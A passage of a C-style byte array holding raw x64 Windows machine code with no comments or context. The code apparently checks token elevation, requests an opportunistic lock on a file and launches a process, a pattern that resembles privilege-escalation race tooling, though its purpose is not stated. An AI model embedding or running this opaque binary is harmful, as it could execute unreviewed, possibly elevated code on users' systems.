	0xAA, 0x48, 0x8B, 0xCA, 0xE8, 0x83, 0x04, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48, 0x85, 0xC0, 0x74,
	0x3B, 0x48, 0x8D, 0x44, 0x24, 0x38, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xCB, 0x48, 0x89, 0x44, 0x24,
	0x20, 0xE8, 0x0E, 0x03, 0x00, 0x00, 0x44, 0x8B, 0xF0, 0x85, 0xC0, 0x74, 0x16, 0x48, 0x8B, 0x4C,
	0x24, 0x40, 0xFF, 0x15, 0x60, 0x22, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0xFF, 0x15, 0x55,
	0x22, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x4C, 0x22, 0x00, 0x00, 0x48, 0x83, 0x7C, 0x24,
	0x58, 0xFF, 0x74, 0x1C, 0x39, 0x74, 0x24, 0x50, 0x72, 0x16, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0xFF,
	0x15, 0x33, 0x22, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xFF, 0x15, 0x28, 0x22, 0x00, 0x00,
	0x45, 0x85, 0xFF, 0x74, 0x1C, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x8B,
	0xC3, 0x33, 0xD2, 0x48, 0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x1F, 0x24, 0x00,
	0x00, 0x4C, 0x8D, 0x9C, 0x24, 0xC0, 0x06, 0x00, 0x00, 0x41, 0x8B, 0xC6, 0x49, 0x8B, 0x5B, 0x30,
	0x49, 0x8B, 0x73, 0x38, 0x49, 0x8B, 0xE3, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x5F, 0x5D, 0xC3,
	0x40, 0x55, 0x53, 0x56, 0x57, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x78, 0x33, 0xDB, 0x8B, 0xC1,
	0xC7, 0x45, 0xC8, 0x30, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x89, 0x5D, 0xE0, 0x48, 0x8B, 0xF2,
	0x48, 0x89, 0x45, 0xB8, 0x48, 0x89, 0x5D, 0xC0, 0xF3, 0x0F, 0x7F, 0x45, 0xD0, 0xF3, 0x0F, 0x7F,
	0x45, 0xE8, 0x48, 0x85, 0xD2, 0x74, 0x02, 0x89, 0x1A, 0x4C, 0x8D, 0x4D, 0xB8, 0xBA, 0x00, 0x00,
	0x00, 0x02, 0x4C, 0x8D, 0x45, 0xC8, 0x48, 0x8D, 0x4D, 0x40, 0xFF, 0x15, 0x58, 0x23, 0x00, 0x00,
	0x8B, 0xF8, 0x85, 0xC0, 0x78, 0x64, 0x48, 0x8B, 0x4D, 0x40, 0x4C, 0x8D, 0x45, 0x38, 0xBA, 0x08,
	0x00, 0x00, 0x00, 0xFF, 0x15, 0xFF, 0x22, 0x00, 0x00, 0x8B, 0xF8, 0x85, 0xC0, 0x78, 0x41, 0x48,
	0x8B, 0x4D, 0x38, 0x48, 0x8D, 0x45, 0x30, 0x41, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x89, 0x5D, 0x28,
	0x4C, 0x8D, 0x45, 0x28, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0x8D, 0x51, 0x10, 0xFF, 0x15, 0x25,
	0x23, 0x00, 0x00, 0x8B, 0xF8, 0x85, 0xC0, 0x78, 0x0D, 0x48, 0x85, 0xF6, 0x74, 0x08, 0x39, 0x5D,
	0x28, 0x0F, 0x97, 0xC3, 0x89, 0x1E, 0x48, 0x8B, 0x4D, 0x38, 0xFF, 0x15, 0x20, 0x23, 0x00, 0x00,
	0x48, 0x8B, 0x4D, 0x40, 0xFF, 0x15, 0x16, 0x23, 0x00, 0x00, 0x8B, 0xC7, 0x48, 0x83, 0xC4, 0x78,
	0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49,
	0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18, 0x45, 0x89, 0x4B, 0x20, 0x57, 0x48, 0x83, 0xEC, 0x70,
	0x48, 0x8B, 0xF1, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x18, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24,
	0xA0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0x07, 0x01, 0x00, 0x00, 0x83, 0x3B, 0x30,
	0x0F, 0x82, 0xFE, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8D, 0x6B, 0x10, 0x48, 0x8B, 0xFD, 0x45,
	0x33, 0xC9, 0x45, 0x33, 0xC0, 0x8D, 0x48, 0x20, 0xF3, 0xAA, 0x49, 0x8D, 0x7B, 0xC8, 0x8D, 0x48,
	0x0C, 0xF3, 0xAA, 0x49, 0x8D, 0x7B, 0xD8, 0xC7, 0x44, 0x24, 0x40, 0x01, 0x00, 0x0C, 0x00, 0x8D,
	0x48, 0x18, 0xC7, 0x44, 0x24, 0x44, 0x03, 0x00, 0x00, 0x00, 0xF3, 0xAA, 0x8D, 0x78, 0x01, 0xC7,
	0x44, 0x24, 0x50, 0x01, 0x00, 0x18, 0x00, 0x8B, 0xD7, 0x89, 0x7C, 0x24, 0x48, 0x33, 0xC9, 0xFF,
	0x15, 0x7B, 0x20, 0x00, 0x00, 0x48, 0x89, 0x43, 0x28, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xA2, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x4D, 0x20, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30,
	0x00, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x47, 0x06, 0x24, 0x10, 0xBA, 0x00, 0x00, 0x00, 0x80, 0xF6,
	0xD8, 0x1B, 0xC9, 0x45, 0x33, 0xC9, 0x81, 0xE1, 0x00, 0x00, 0x20, 0x02, 0x81, 0xC1, 0x00, 0x00,
	0x00, 0x40, 0x89, 0x4C, 0x24, 0x28, 0x48, 0x8B, 0xCE, 0xC7, 0x44, 0x24, 0x20, 0x03, 0x00, 0x00,
	0x00, 0xFF, 0x15, 0xC1, 0x20, 0x00, 0x00, 0x48, 0x89, 0x43, 0x08, 0x48, 0x83, 0xF8, 0xFF, 0x74,
	0x53, 0x48, 0x89, 0x6C, 0x24, 0x38, 0x48, 0x8D, 0x8C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x4C, 0x24, 0x30, 0x45, 0x33, 0xC9, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0xC8, 0x45, 0x33, 0xC0, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00,
	0x09, 0x00, 0xC7, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x65,
	0x20, 0x00, 0x00, 0xFF, 0x15, 0xDF, 0x1F, 0x00, 0x00, 0x3D, 0xE5, 0x03, 0x00, 0x00, 0x75, 0x04,
	0x8B, 0xC7, 0xEB, 0x02, 0x33, 0xC0, 0x4C, 0x8D, 0x5C, 0x24, 0x70, 0x49, 0x8B, 0x5B, 0x10, 0x49,
	0x8B, 0x6B, 0x18, 0x49, 0x8B, 0x73, 0x20, 0x49, 0x8B, 0xE3, 0x5F, 0xC3, 0x40, 0x53, 0x48, 0x83,
	0xEC, 0x20, 0x48, 0x8D, 0x54, 0x24, 0x40, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0xD9, 0xFF, 0x15, 0xE0, 0x20, 0x00, 0x00, 0x83, 0x7C, 0x24, 0x40, 0x00, 0x74, 0x37, 0xFF,
	0x15, 0xC3, 0x1F, 0x00, 0x00, 0x3B, 0x44, 0x24, 0x40, 0x75, 0x2B, 0xBA, 0x04, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xC7, 0x20, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x18, 0x48, 0x8B,
	0xCB, 0xFF, 0x15, 0xC1, 0x20, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x0B, 0x33, 0xD2, 0x48, 0x8B, 0xCB,
	0xFF, 0x15, 0xBA, 0x20, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5B,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x18, 0x48,
	0x89, 0x78, 0x20, 0x48, 0x89, 0x50, 0x10, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x68, 0xA9,
	0x48, 0x81, 0xEC, 0xD0, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x75, 0x7F, 0x33, 0xDB, 0x48, 0x89, 0x5D,
	0xBF, 0x4C, 0x8B, 0xF9, 0x4D, 0x85, 0xF6, 0x0F, 0x84, 0x00, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x4D,
	0xBF, 0x45, 0x33, 0xC0, 0x8D, 0x53, 0x01, 0x33, 0xC9, 0xFF, 0x15, 0xA1, 0x1F, 0x00, 0x00, 0x65,
	0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x8D, 0x53, 0x08, 0x4C, 0x8B, 0x45, 0xBF, 0x48,
	0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x8B, 0x20, 0x00, 0x00, 0x48, 0x8B, 0xF0,
	0x48, 0x85, 0xC0, 0x0F, 0x84, 0xC4, 0x00, 0x00, 0x00, 0x44, 0x8D, 0x43, 0x70, 0x33, 0xC0, 0x41,
	0x8B, 0xC8, 0x48, 0x8D, 0x7D, 0xCF, 0xF3, 0xAA, 0x44, 0x89, 0x45, 0xCF, 0x8D, 0x43, 0x05, 0x45,
	0x33, 0xC0, 0x66, 0x89, 0x45, 0x0F, 0x48, 0x8B, 0xCE, 0xC7, 0x45, 0x0B, 0x81, 0x00, 0x00, 0x00,
	0x4C, 0x8D, 0x4D, 0xBF, 0x8D, 0x53, 0x01, 0xFF, 0x15, 0x43, 0x1F, 0x00, 0x00, 0x85, 0xC0, 0x74,
	0x70, 0x48, 0x89, 0x5C, 0x24, 0x30, 0x4C, 0x8D, 0x4D, 0x67, 0x48, 0x89, 0x5C, 0x24, 0x28, 0x33,
	0xD2, 0x41, 0xB8, 0x00, 0x00, 0x02, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x08, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x87, 0x1E, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x3B, 0x4C, 0x89, 0x74,
	0x24, 0x48, 0x48, 0x8D, 0x45, 0xCF, 0x48, 0x89, 0x44, 0x24, 0x40, 0x45, 0x33, 0xC9, 0x48, 0x89,
	0x5C, 0x24, 0x38, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x5C, 0x24, 0x30, 0x49, 0x8B, 0xD7, 0xC7, 0x44,
	0x24, 0x28, 0x10, 0x00, 0x08, 0x00, 0x33, 0xC9, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x89, 0x75, 0x37,
	0xFF, 0x15, 0x7A, 0x1E, 0x00, 0x00, 0x8B, 0xD8, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x57, 0x1E, 0x00,
	0x00, 0x65, 0x48, 0x8B, 0x0C, 0x25, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC6, 0x33, 0xD2, 0x48,
	0x8B, 0x49, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x43, 0x20, 0x00, 0x00, 0x4C, 0x8D, 0x9C,
	0x24, 0xD0, 0x00, 0x00, 0x00, 0x8B, 0xC3, 0x49, 0x8B, 0x5B, 0x20, 0x49, 0x8B, 0x73, 0x30, 0x49,
	0x8B, 0x7B, 0x38, 0x49, 0x8B, 0xE3, 0x41, 0x5F, 0x41, 0x5E, 0x5D, 0xC3, 0x48, 0x89, 0x5C, 0x24,
	0x08, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0xF1, 0x48, 0xC7,
	0x44, 0x24, 0x58, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xCA, 0x20, 0x00, 0x00, 0x33, 0xDB,
	0xFF, 0x15, 0xEA, 0x1D, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48, 0x85, 0xC0, 0x74, 0x61, 0x48, 0x8D,
	0x15, 0xCB, 0x20, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x5A, 0x1E, 0x00, 0x00, 0x48, 0x85,
	0xC0, 0x74, 0x08, 0x48, 0x8B, 0xCE, 0xFF, 0xD0, 0x48, 0x8B, 0xD8, 0x48, 0x8B, 0xCF, 0xFF, 0x15,
	0xE4, 0x1D, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x74, 0x36, 0x48, 0x83, 0xCA, 0xFF, 0xC7, 0x44, 0x24,
	0x30, 0x02, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC2, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,
	0x4C, 0x8D, 0x4C, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB,
	0xFF, 0x15, 0x5A, 0x1D, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x79, 0x1D, 0x00, 0x00, 0x48,
	0x8B, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x8B, 0x74, 0x24, 0x60, 0x48, 0x83,
	0xC4, 0x40, 0x5F, 0xC3, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x56, 0x57, 0x48, 0x8B, 0xEC, 0x48,
	0x83, 0xEC, 0x40, 0x48, 0x8B, 0xF2, 0xC7, 0x45, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x55,
	0x30, 0x48, 0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xF9, 0xC7, 0x45, 0x38, 0x00,
	0x00, 0x00, 0x00, 0xFF, 0x15, 0x5F, 0x1E, 0x00, 0x00, 0x44, 0x8B, 0x45, 0x30, 0x45, 0x85, 0xC0,
	0x74, 0x34, 0x33, 0xD2, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xFF, 0x15, 0xF9, 0x1C, 0x00, 0x00, 0x48,
	0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x74, 0x1F, 0x4C, 0x8D, 0x45, 0xF8, 0xBA, 0x00, 0x00, 0x00, 0x02,
	0x48, 0x8B, 0xC8, 0xFF, 0x15, 0xAF, 0x1C, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x85, 0xC0, 0x75, 0x18,
	0xFF, 0x15, 0xF2, 0x1C, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x60,
	0x48, 0x83, 0xC4, 0x40, 0x5F, 0x5E, 0x5D, 0xC3, 0xFF, 0x15, 0xDA, 0x1C, 0x00, 0x00, 0x48, 0x8B,
	0x4D, 0xF8, 0x48, 0x8D, 0x45, 0xF0, 0x41, 0xB9, 0x04, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xF0, 0x00,
	0x00, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0x38, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0x8D, 0x51, 0x0E,
	0xFF, 0x15, 0x72, 0x1C, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0xF8, 0x85, 0xC0, 0x74, 0xB2, 0xFF, 0x15,
	0xA4, 0x1C, 0x00, 0x00, 0x83, 0x7D, 0x38, 0x02, 0x75, 0xAC, 0x48, 0x89, 0x3E, 0x33, 0xC0, 0xEB,
	0xAA, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x55, 0x57,
	0x41, 0x56, 0x48, 0x8D, 0xAC, 0x24, 0xF0, 0xF3, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0x10, 0x0D, 0x00,
	0x00, 0x45, 0x33, 0xF6, 0xC7, 0x85, 0x30, 0x0C, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0xD9, 0x41, 0x8B, 0xF6, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xEF, 0x00, 0x00, 0x00, 0x83, 0x39, 0x30,
	0x0F, 0x82, 0xE6, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8D, 0x7D, 0xE0, 0xB9, 0x10, 0x04, 0x00,
	0x00, 0x33, 0xD2, 0xF3, 0xAA, 0x48, 0x8D, 0x4D, 0xE0, 0xE8, 0x5A, 0xED, 0xFF, 0xFF, 0x48, 0x8D,
	0x55, 0xE0, 0x48, 0x8D, 0x8D, 0xF0, 0x03, 0x00, 0x00, 0xE8, 0xF6, 0x01, 0x00, 0x00, 0x48, 0x8D,
	0x15, 0x3B, 0x1F, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE0, 0xE8, 0x3A, 0x01, 0x00, 0x00, 0x48, 0x8D,
	0x15, 0x5B, 0x1F, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xF0, 0x03, 0x00, 0x00, 0xE8, 0x27, 0x01, 0x00,
	0x00, 0x48, 0x8D, 0x4D, 0xE0, 0x48, 0x89, 0x5C, 0x24, 0x20, 0xE8, 0xD9, 0xFA, 0xFF, 0xFF, 0x85,
	0xC0, 0x0F, 0x84, 0x85, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8D, 0x7C, 0x24, 0x50, 0x45, 0x33,
	0xC9, 0x45, 0x33, 0xC0, 0x8D, 0x50, 0x68, 0x8D, 0x48, 0x18, 0xF3, 0xAA, 0x8B, 0xCA, 0x48, 0x8D,
	0x7C, 0x24, 0x70, 0xF3, 0xAA, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x89, 0x54, 0x24, 0x70, 0x48, 0x89,
	0x44, 0x24, 0x48, 0x48, 0x8D, 0x95, 0xF0, 0x03, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x70, 0xC7,
	0x45, 0xAC, 0x81, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x33, 0xC9, 0x4C, 0x89, 0x74,
	0x24, 0x38, 0x4C, 0x89, 0x74, 0x24, 0x30, 0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x00, 0x44,
	0x89, 0x74, 0x24, 0x20, 0x66, 0x44, 0x89, 0x75, 0xB0, 0xFF, 0x15, 0xB1, 0x1B, 0x00, 0x00, 0x85,
	0xC0, 0x75, 0x33, 0x83, 0x3B, 0x30, 0x72, 0x14, 0x48, 0x8B, 0x4B, 0x28, 0xFF, 0x15, 0x76, 0x1B,
	0x00, 0x00, 0x48, 0x8B, 0x4B, 0x08, 0xFF, 0x15, 0x6C, 0x1B, 0x00, 0x00, 0x33, 0xC0, 0x4C, 0x8D,
	0x9C, 0x24, 0x10, 0x0D, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x28, 0x49, 0x8B, 0x73, 0x30, 0x49, 0x8B,
	0xE3, 0x41, 0x5E, 0x5F, 0x5D, 0xC3, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xFF, 0x15, 0x47, 0x1B, 0x00,
	0x00, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xBA, 0xB8, 0x0B, 0x00, 0x00, 0xFF, 0x15, 0x4F, 0x1B, 0x00,
	0x00, 0x85, 0xC0, 0x75, 0x21, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x8D, 0x95, 0x30, 0x0C, 0x00,
	0x00, 0xFF, 0x15, 0x59, 0x1B, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x0B, 0x44, 0x39, 0xB5, 0x30, 0x0C,
	0x00, 0x00, 0x40, 0x0F, 0x94, 0xC6, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x07, 0x1B, 0x00,
	0x00, 0x85, 0xF6, 0x75, 0x19, 0x83, 0x3B, 0x30, 0x72, 0x14, 0x48, 0x8B, 0x4B, 0x28, 0xFF, 0x15,
	0xF4, 0x1A, 0x00, 0x00, 0x48, 0x8B, 0x4B, 0x08, 0xFF, 0x15, 0xEA, 0x1A, 0x00, 0x00, 0x8B, 0xC6,
	0xE9, 0x79, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0x45, 0x33, 0xC0, 0x48, 0x85, 0xC9, 0x74, 0x30,
	0x48, 0x85, 0xD2, 0x74, 0x2B, 0xEB, 0x04, 0x48, 0x83, 0xC1, 0x02, 0x66, 0x44, 0x39, 0x01, 0x75,
	0xF6, 0x0F, 0xB7, 0x02, 0x66, 0x85, 0xC0, 0x74, 0x13, 0x48, 0x2B, 0xD1, 0x66, 0x89, 0x01, 0x48,
	0x83, 0xC1, 0x02, 0x0F, 0xB7, 0x04, 0x0A, 0x66, 0x85, 0xC0, 0x75, 0xF0, 0x66, 0x44, 0x89, 0x01,
	0x48, 0x8B, 0xC1, 0xC3, 0x48, 0x3B, 0xCA, 0x75, 0x03, 0x33, 0xC0, 0xC3, 0x48, 0x85, 0xC9, 0x75,
	0x04, 0x83, 0xC8, 0xFF, 0xC3, 0x48, 0x85, 0xD2, 0x75, 0x04, 0x8D, 0x42, 0x01, 0xC3, 0x48, 0x2B,
	0xCA, 0x0F, 0xB7, 0x04, 0x11, 0x44, 0x0F, 0xB7, 0x04, 0x11, 0x66, 0x83, 0xE8, 0x41, 0x44, 0x0F,
	0xB7, 0x0A, 0x66, 0x41, 0x83, 0xC0, 0x20, 0x66, 0x83, 0xF8, 0x19, 0x0F, 0xB7, 0x02, 0x66, 0x44,
	0x0F, 0x47, 0x04, 0x11, 0x66, 0x41, 0x83, 0xC1, 0x20, 0x66, 0x83, 0xE8, 0x41, 0x66, 0x83, 0xF8,
	0x19, 0x66, 0x44, 0x0F, 0x47, 0x0A, 0x48, 0x8D, 0x52, 0x02, 0x66, 0x45, 0x85, 0xC0, 0x74, 0x06,
	0x66, 0x45, 0x3B, 0xC1, 0x74, 0xBB, 0x41, 0x0F, 0xB7, 0xC9, 0x41, 0x0F, 0xB7, 0xC0, 0x2B, 0xC1,
	0xC3, 0xCC, 0xCC, 0xCC, 0x45, 0x33, 0xC9, 0x48, 0x85, 0xC9, 0x74, 0x31, 0x48, 0x85, 0xD2, 0x74,
	0x2C, 0x48, 0x3B, 0xCA, 0x74, 0x27, 0x44, 0x0F, 0xB7, 0x02, 0x48, 0x8B, 0xC1, 0x66, 0x45, 0x85,
	0xC0, 0x74, 0x16, 0x48, 0x2B, 0xD1, 0x66, 0x44, 0x89, 0x00, 0x48, 0x83, 0xC0, 0x02, 0x44, 0x0F,
	0xB7, 0x04, 0x02, 0x66, 0x45, 0x85, 0xC0, 0x75, 0xED, 0x66, 0x44, 0x89, 0x08, 0x48, 0x8B, 0xC1,
	0xC3, 0xCC, 0xCC, 0xCC, 0x33, 0xD2, 0x48, 0x8B, 0xC1, 0x48, 0x85, 0xC9, 0x75, 0x05, 0xC3, 0x48,
	0x83, 0xC1, 0x02, 0x66, 0x39, 0x11, 0x75, 0xF7, 0x48, 0x2B, 0xC8, 0x48, 0xD1, 0xF9, 0x48, 0x8B,
	0xC1, 0xC3, 0xCC, 0xCC, 0x45, 0x33, 0xDB, 0x41, 0xB9, 0x04, 0x01, 0x00, 0x00, 0x48, 0x85, 0xC9,
	0x74, 0x3A, 0x4D, 0x85, 0xC0, 0x74, 0x35, 0x41, 0x0F, 0xB7, 0x10, 0x48, 0x8B, 0xC1, 0x66, 0x85,
	0xD2, 0x74, 0x25, 0x4C, 0x2B, 0xC1, 0x4D, 0x8D, 0x51, 0xFF, 0x4D, 0x85, 0xD2, 0x74, 0x19, 0x4D,
	0x85, 0xC9, 0x74, 0x14, 0x66, 0x89, 0x10, 0x4D, 0x8B, 0xCA, 0x48, 0x83, 0xC0, 0x02, 0x41, 0x0F,
	0xB7, 0x14, 0x00, 0x66, 0x85, 0xD2, 0x75, 0xDE, 0x66, 0x44, 0x89, 0x18, 0x48, 0x8B, 0xC1, 0xC3,
	0xC2, 0x00, 0x00, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x33, 0xC0,
	0x48, 0x8D, 0x3D, 0x59, 0x59, 0x00, 0x00, 0xB9, 0x34, 0x08, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D,
	0x0D, 0x4B, 0x59, 0x00, 0x00, 0xE8, 0x7A, 0xED, 0xFF, 0xFF, 0x8B, 0xD8, 0x85, 0xC0, 0x74, 0x13,
	0x48, 0x8D, 0x3D, 0x45, 0x59, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0x55, 0xFF, 0xFF, 0xFF, 0x03,
	0xC0, 0xEB, 0x04, 0x33, 0xFF, 0x33, 0xC0, 0x8B, 0xD0, 0x48, 0x8B, 0xCF, 0xE8, 0x83, 0xF0, 0xFF,
	0xFF, 0x33, 0xFF, 0x85, 0xC0, 0x40, 0x0F, 0x95, 0xC7, 0x85, 0xDB, 0x74, 0x0C, 0x48, 0x8D, 0x0D,
	0x36, 0x5F, 0x00, 0x00, 0xE8, 0xEB, 0xEE, 0xFF, 0xFF, 0x8B, 0xCF, 0xFF, 0x15, 0x67, 0x19, 0x00,
	0x00, 0xCC, 0xCC, 0xCC, 0x4D, 0x8B, 0xC8, 0x4C, 0x8B, 0xC2, 0x8B, 0xD1, 0x33, 0xC9, 0x48, 0xFF,
	0x25, 0x1B, 0x1A, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
	0x89, 0x70, 0x18, 0x89, 0x50, 0x10, 0x55, 0x57, 0x41, 0x56, 0x48, 0x8D, 0xA8, 0x98, 0xFE, 0xFF,
	0xFF, 0x48, 0x81, 0xEC, 0x50, 0x02, 0x00, 0x00, 0x48, 0x8B, 0xF1, 0x48, 0x8D, 0x7C, 0x24, 0x40,
	0x33, 0xC0, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x49, 0x8B, 0xD8, 0xB9, 0x0A, 0x02, 0x00, 0x00, 0xF3,
	0xAA, 0x33, 0xC9, 0x41, 0xB8, 0x04, 0x01, 0x00, 0x00, 0xFF, 0x15, 0x31, 0x19, 0x00, 0x00, 0x45,
	0x33, 0xF6, 0x85, 0xC0, 0x0F, 0x84, 0xA9, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x4C, 0x24, 0x40, 0x48,
	0x8D, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x7C, 0x24, 0x40, 0x66, 0x85, 0xC9, 0x74, 0x1D, 0x48, 0x83,
	0xC0, 0x02, 0x66, 0x83, 0xF9, 0x5C, 0x75, 0x03, 0x48, 0x8B, 0xF8, 0x0F, 0xB7, 0x08, 0x48, 0x8B,
	0xD7, 0x66, 0x85, 0xC9, 0x75, 0xE8, 0x48, 0x85, 0xD2, 0x74, 0x78, 0x48, 0x8D, 0x15, 0x3E, 0x1C,
	0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0xCA, 0xFD, 0xFF, 0xFF, 0x85, 0xC0, 0x75, 0x4D, 0x48, 0x8D,
	0x15, 0x3B, 0x1C, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0xEA, 0x18, 0x00, 0x00, 0x48, 0x85,
	0xC0, 0x74, 0x2F, 0x45, 0x33, 0xC9, 0x4C, 0x8B, 0xC6, 0x48, 0x8B, 0xD0, 0x41, 0x8D, 0x49, 0x04,
	0xFF, 0x15, 0x6A, 0x19, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48, 0x85, 0xC0, 0x74, 0x14, 0xB9, 0x98,
	0x3A, 0x00, 0x00, 0xFF, 0x15, 0x6F, 0x18, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x46, 0x19,
	0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15, 0x6E, 0x18, 0x00, 0x00, 0xCC, 0x48, 0x85, 0xDB, 0x74, 0x2B,
	0x48, 0x8B, 0xD3, 0x48, 0x8B, 0xCF, 0xE8, 0x69, 0xFD, 0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x84, 0x97,
	0x00, 0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24, 0x50, 0x02, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x20, 0x49,
	0x8B, 0x73, 0x30, 0x49, 0x8B, 0xE3, 0x41, 0x5E, 0x5F, 0x5D, 0xC3, 0x4C, 0x89, 0x74, 0x24, 0x30,
